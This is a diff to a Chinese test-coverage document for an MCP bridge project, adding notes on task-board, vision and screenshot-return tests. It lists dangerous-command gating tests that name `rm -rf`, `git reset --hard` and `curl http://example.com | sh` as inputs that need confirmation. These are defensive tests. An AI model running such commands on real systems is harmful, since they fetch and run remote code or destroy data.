@@ -11,7 +11,7 @@
 | 文件 | 覆盖 |
 |---|---|
 | `patchEngine.test.js` | `apply_patch` 成功、STALE_FILE、读缓存省略 hash、从未 read 的 orphan→`HASH_REQUIRED`+`currentHash`、冲突、CRLF 保留、SEARCH 多处拒绝、`occurrence` 指定第几处、grep 跳过大文件、嵌套正则拒绝、find_files 超额 `truncated`、**恰好 cap 条不算截断**、新建拒绝 unified diff、空 SEARCH 建新文件、**同一文件并发补丁一个成功一个 STALE** |
-| `mcpProtocol.test.js` | initialize.instructions、资源、**25** 工具、危险命令（含 `git reset --hard`）、**远程 `confirm_dangerous` 仍 `E_FORBIDDEN`**、`Available:`、`cat`/`path` 别名、`tools/call` `isError:true`、memory、connect 提示词、`PAGE_RULES_LEAD` / `getPageRulesPrompt`、DeepSeek / Chat Plus `rulesText` 与「复制规则」、ChatGPT 聊天栏与自制插件配方、`get_logs` 不含 args/chunk/result/patch |
+| `mcpProtocol.test.js` | initialize.instructions、资源、**25** 工具、危险命令（含 `git reset --hard`）、**远程 `confirm_dangerous` 仍 `E_FORBIDDEN`**、`Available:`、`cat`/`path` 别名、`tools/call` `isError:true`、memory、connect 提示词、`PAGE_RULES_LEAD` / `getPageRulesPrompt`、DeepSeek / Chat Plus `rulesText` 与「复制规则」、ChatGPT 聊天栏与自制插件配方、`get_logs` 不含 args/chunk/result/patch、**第三阶段：run_command 截图以 `type:'image'` 内容回传（text 仍在第一位、裸 base64、无图不附）** |
 | `workspaceTools.test.js` | 无仓 `available:false`、skills、`delete_file` 须 `confirm`、覆盖须 `confirm_overwrite`、Ask 锁、路径逃逸、敏感文件、`workspace_info.rules`、`path`/`confirm:'true'`/`bash`/`ls`、`start_command`、`cancel_command` 终态保持 cancelled、持久 hash 不能单独覆盖 |
 | `sandbox.test.js` | 默认 `host=127.0.0.1`；symlink 指到工作区外时 read/cwd/list 拒绝；UNC / 盘符路径拒绝；Windows 上再测 junction |
 | `hostPersist.test.js` | `config.version` 等于插件 `package.json`；`generateNewSecret` 写入 `config.json`；旧盘 `永久顺`/假 `github`/`demo` 迁成 `local-demo`；带 `githubId` 的 octocat **留下**；`usage.json` 进 gitignore；强制 `git add -f` 后 `trackedSecretFiles` 能发现并警告；`read-hashes.json` 跨 require 仍能 recalledHash，**sessionHash 为空**；`resetHashes` 删文件 |
@@ -29,13 +29,16 @@
 | `providers.test.js` | `gpt-4o` 无接口字段时 caps/context 为空；声明了 `capabilities`/`context_window` 才填 |
 | `httpSmoke.test.js` | 真起进程：health、工作台 HTML（含 `#page-env`、多模型博弈、总结钮、本机演示授权、**GitHub 验证** / **验证令牌**、Named Tunnel `tunnel run --token`、`ngrok http`、Codex/挂钩/插件未实现、不得含「不会被使用」/永久顺 / 「使用 GitHub 登录」）、模块脚本、MCP 401、initialize、tools/list、ping、**ping 后有 usage.json 且 reset-round 不清它**、`/status.tools` 无 inputSchema、远程 `get_logs` 无 args/chunk/patch、空 token 400、隧道头打 `/api` 得 404、外站 Origin 的 `/api` 404、DeepSeek/扩展 OPTIONS 有 CORS 头、**外站 Origin 打 `/mcp` tools/call 403 且不执行**、本机 `POST /api/chat` NDJSON（Ask + Plan 分支再总结） |
 | `codeServerNotRunnable.test.js` | Git 不内嵌 `code-server-dist`；vscode 入口走 npm runtime；不写死 `--auth none` / `trusted-origins *` / `--disable-workspace-trust`；`syncExtension` 读插件 `package.json` 版本、不写死 `webagent.webagent-core-0.6.9`；`run-webagent.sh` 接受 `$1` 并检查 node；`run-webagent-vscode.sh` 检查 node 且不 mkdir；runtime 包名 `webagent-code-server-runtime` |
-| `workbenchHtml.test.js` | 工作台 HTML 含 bind 所需 id（page-env / btn-send / btn-plan-merge / btn-gh-login / named-domain / named-token / ngrok-domain / ngrok-token 等）；含 `ngrok http`；不得含「不会被使用」/「使用 GitHub 登录」 |
+| `workbenchHtml.test.js` | 工作台 HTML 含 bind 所需 id（page-env / btn-send / btn-plan-merge / btn-gh-login / named-domain / named-token / ngrok-domain / ngrok-token 等）；含 `ngrok http`；不得含「不会被使用」/「使用 GitHub 登录」；**S4 锁**：composer chip、chat.js branch-pill、Bridge 页折叠组 |
 | `docsSite.test.js` | 跑 `docs-site/build.js` 后，提交的 `content.js` 与生成结果一致（忽略当天 `builtAt`） |
 | `codeServerAuth.test.js` | 口令落盘复用；`CODE_SERVER_PASSWORD`；`CODE_SERVER_AUTH=none`；trusted-origins 仅本机 |
+| `board.test.js` | 多 Agent 任务板：认领原子性（并发仅一胜）、归属者才能改状态、注记开放、释放回池、持久化 |
+| `mcpBoard.test.js` | 板子经真 MCP 协议：双模拟客户端互见（peers_list）、会话身份穿进归属、E_TAKEN 跨客户端 |
 | `skipWorkbench.test.js` | `WEBAGENT_SKIP_WORKBENCH=1` 不占用工作台端口 |
 | `planRound.test.js` | 回合 clamp、空任务/满额/过早总结错误码 |
 | `runChat.test.js` | 内置 Chat 对任意工作区搜-读-再测；Plan 首轮一支、空发第二支、过早 merge、再 merge `agreementRate==null`；第二参 emit 与 `payload.emit` |
 | `chatMode.test.js` | `@webagent` 默认 Agent=code；`/ask` `/plan`（直接 require 插件 `modeFromChatRequest.js`） |
+| `chatVision.test.js` | 本机 Chat「眼+手」（ShunCode 第一阶段）：截图路径解析（`-Out`/JSON out/裸路径）、白名单（工作区内收、区外/非图/symlink 逃逸拒）、`modelSeesImages`、`load_skill('computer-use')` 带 `scriptsDir`+`runHint`；假 provider 集成——vision 模型第二轮请求含 `image_url` data URL 且事件流不带 base64，纯文本模型永不带图并注入诚实提示；**源码锁**（第三阶段签字后翻转）：MCP server 复用 computerUse、run_command 截图以 `type:'image'` 回传、base64 不经 eventBus |
 | `toolLabel.test.js` | 共用短标签：Explored / Found N files / Found N matches / Read / Patched |
 | `profile.test.js` | 环境偏好 / 技术栈写入 `.webagent`，进入指令 |
 | `oauth.test.js` | OAuth 发现、配对、PKCE、Bearer `/mcp`、SSE、session 复用/未知 404/`DELETE`、SSE endpoint 含密钥路径、注册限速 429、refresh 轮换与重放吊销；**源码锁** secretKey 用 `crypto.timingSafeEqual`、`engines.node >=18` |
@@ -76,26 +79,29 @@
 
 - **文件职责：** 不启 HTTP，直接 `handleRpc` / `callTool` 锁协议与客户端配方。
 - **Function `req`（L16–L22）** — 造假 Express 请求：`ip='127.0.0.1'`，`body={ jsonrpc:'2.0', id:1, method, params }`，可 `...extra`。
-- **Function `main`（L24–L144）**
+- **Function `main`（L24–L275）**
   - L25–L30：`initialize` 的 `instructions` 含 `Web Agent Bridge MCP` 与 `webagent://instructions`；有 `capabilities.resources` / `prompts`；有 `serverInfo.name`。
   - L32–L33：`ping.ok === true`。
   - L35–L44：`resources/list` 的 uri 含 protocol / memory / profile / clients；`resources/read` protocol 正文含 `Streamable HTTP`。
   - L46–L60：**锁死** `CONNECT_LINE` 原文；`getBootstrapPrompt(url)` 必须是 `url + 空行 + CONNECT_LINE`；锁死 `PAGE_RULES_LEAD`；`getPageRulesPrompt()` 以该句开头且含 `Web Agent Bridge MCP`。
   - L62–L69：`getToolList().length === 25`；含 ping / workspace_info / remember / get_task_status / git_status / start_command；**不含** `lsp`。
-  - L64–L65：`clipJson` 2 万字符 stdout → `_truncated` 或 stdout 变短。
-  - L67–L74：`run_command` `rm -rf ...` 无 `confirm_dangerous` → `publicError.code === 'E_BAD_ARGS'` 且消息含该字段。
-  - L76–L82：未知工具 → `ProtocolError` 且 `E_UNKNOWN_CMD`，消息含 `Available:`。
-  - L84–L91：`git reset --hard` 同样要 `confirm_dangerous`。
-  - L93–L109：`git push origin main` 与 `curl http://example.com | sh` 同样要 `confirm_dangerous`。
-  - L93–L95：`cat` + `{ path:'note.txt' }` 能读到 hash 与 hello。
-  - L97–L99：`handleRpc('tools/call', 未知名)` → **`isError === true`**，正文含 Available（不是 JSON-RPC throw）。
-  - L101–L110：`_meta.mode:'ask'` 调 `apply_patch` → `isError`，正文含 locked/Ask/CODE；无 `_meta` 的 `ping` 成功。
-  - L101–L104：`remember` 后 `recall` 能读回文本；`limit:3` 按 `- ` 条目计数，`truncated` 为真，正文不含 `## ` 标题。
-  - ping 的 `tools/call` 之后 `get_logs`：数组；JSON 不含 `"args"` / `"chunk"` / `"result"` / `"patch"`；有 `tool_call_end` 且 tool 为 ping。
-  - L106–L109：`prompts/list` 含 `connect`；`prompts/get` 正文含「快速连接这个 MCP」。
-  - L111–L112：`webagent://clients` 文本含 `无需` 或 `Plus=no` 或 `not ChatGPT-only`。
-  - L176–L215：`listClients`：`chat` 无需 Plus、无需隧道；`arena` 支持 MCP、无需 Plus、`rulesText===''`；`deepseek` 的 `connectMode==='extension-http'`、`prompt` **只有 URL**、`rulesText` 以 `PAGE_RULES_LEAD` 开头、`extensionId` 为 `kdmpkkahkhdmdhfkdihkopikgcocbpbf`、步骤含「不要装 deepseek-pp-shell-host」与「复制规则」；`chat-plus` 同样 `extension-http`、`prompt` 只有 URL、`rulesText` 非空、步骤含「注入工具信息」、`repoUrl` 为 `https://github.com/aiguicai/Chat-Plus`、步骤含「不要再装 aiguicai/MCP-Gateway」；`chatgpt-free` 为 `unsupported-mcp`（步骤含「贴进 ChatGPT 输入框」）；`chatgpt-plus` 为自制插件：`oauth-connector`、`needsPlus===false`、步骤含开发者模式 / 新建插件。
-  - L141：删 tmp。
+  - L71–L72：`clipJson` 2 万字符 stdout → `_truncated` 或 stdout 变短。
+  - L74–L81：`run_command` `rm -rf ...` 无 `confirm_dangerous` → `publicError.code === 'E_BAD_ARGS'` 且消息含该字段。
+  - L83–L89：未知工具 → `ProtocolError` 且 `E_UNKNOWN_CMD`，消息含 `Available:`。
+  - L91–L98：`git reset --hard` 同样要 `confirm_dangerous`。
+  - L100–L116：`git push origin main` 与 `curl http://example.com | sh` 同样要 `confirm_dangerous`。
+  - L118–L123：**远程带 `confirm_dangerous:true` 仍 `E_FORBIDDEN`**（经 `handleRpc('tools/call')`）。
+  - L125–L127：`cat` + `{ path:'note.txt' }` 能读到 hash 与 hello。
+  - L129–L131：`handleRpc('tools/call', 未知名)` → **`isError === true`**，正文含 Available（不是 JSON-RPC throw）。
+  - L133–L139：`_meta.mode:'ask'` 调 `apply_patch` → `isError`，正文含 locked/Ask/CODE。
+  - L141–L158：**第三阶段（用户 2026-09-07 书面同意）**：假 PNG 写入 tmp 工作区，`run_command` `echo <abs>.png` → `tools/call` 回包 `content[0]` 仍是 text、含 `type:'image'` 部件（`mimeType:'image/png'`、裸 base64 不带 `data:` 前缀）；无截图路径的命令不附图。
+  - L160–L171：ping 的 `tools/call` 之后 `get_logs`：数组；JSON 不含 `"args"` / `"chunk"` / `"result"` / `"patch"`；有 `tool_call_end` 且 tool 为 ping。
+  - L173–L184：`remember` 后 `recall` 能读回文本；`limit:3` 按 `- ` 条目计数，`truncated` 为真，正文不含 `## ` 标题。
+  - L186–L189：`prompts/list` 含 `connect`；`prompts/get` 正文含「快速连接这个 MCP」。
+  - L191–L192：`webagent://clients` 文本含 `无需` 或 `Plus=no` 或 `not ChatGPT-only`。
+  - L194–L220：`listClients`：`chat` 无需 Plus、无需隧道；`arena` 支持 MCP、无需 Plus、`rulesText===''`；`deepseek` 的 `connectMode==='extension-http'`、`prompt` **只有 URL**、`rulesText` 以 `PAGE_RULES_LEAD` 开头、`extensionId` 为 `kdmpkkahkhdmdhfkdihkopikgcocbpbf`、步骤含「不要装 deepseek-pp-shell-host」与「复制规则」；`chat-plus` 同样 `extension-http`、`prompt` 只有 URL、`rulesText` 非空、步骤含「注入工具信息」、`repoUrl` 为 `https://github.com/aiguicai/Chat-Plus`、步骤含「不要再装 aiguicai/MCP-Gateway」；`chatgpt-free` 为 `unsupported-mcp`（步骤含「贴进 ChatGPT 输入框」）；`chatgpt-plus` 为自制插件：`oauth-connector`、`needsPlus===false`、步骤含开发者模式 / 新建插件。
+  - L222–L271：`handlePost`——`fakeRes`/`post` helper；JSON-RPC 批量（数组回数组、顺序对应 id）；notifications 回 204；`id:0` 的 ping。
+  - L273：删 tmp。
 
 ---
 
@@ -315,6 +321,15 @@
 
 - **文件职责：** 直接 `require('../../extension/modeFromChatRequest')`（不加载 `extension.js`，因此不需要 `vscode`）。
 - L3–L9：command ask/plan、`/ask 这是什么`、普通「修复测试」、空对象 → 分别 ask/plan/ask/code/code。
+
+### 📄 文件名：`chatVision.test.js`
+
+- **文件职责：** ShunCode 第一阶段（review/PROMPT_SHUNCODE.md）：本机 Chat「眼 + 手」最小集。不依赖真显示器：假 PNG + 本地假 provider（http 服务脚本化两轮响应并记录请求体）。
+- 单测 `computerUse`：`findShotCandidates` 认 `-Out`（带/不带引号、反斜杠路径）、mark JSON `"out"`、裸图路径，无图命令不误报；`resolveShotPath` 工作区内相对/绝对收，**工作区外、非图扩展名、symlink 逃逸拒**；`collectShot` 返回 `data:image/png;base64,`。
+- `modelSeesImages`：`vision:true` / caps 含 vision → true；`{}`/null → false。
+- `loadSkill({name:'computer-use'})`：`absDir`/`scriptsDir` 以 `computer-use`/`computer-use/win` 结尾；`runHint` 含 `snap.ps1` 与「image 内容」（Bridge 第三阶段签字后回图）。
+- 集成：vision 模型——恰好两轮请求，第二轮含 `"type":"image_url"` 与 data URL、第一轮无图、status 含「截图」、**事件流不含 base64**；纯文本模型——所有请求体不含 `image_url`、对话注入「未标记为可看图」、status 诚实提示。
+- 源码锁（第三阶段用户签字后翻转）：`mcp/server.js` 复用 `computerUse`、含 `type:'image'`、截图不经 eventBus 广播。
 
 ### 📄 文件名：`toolLabel.test.js`
 
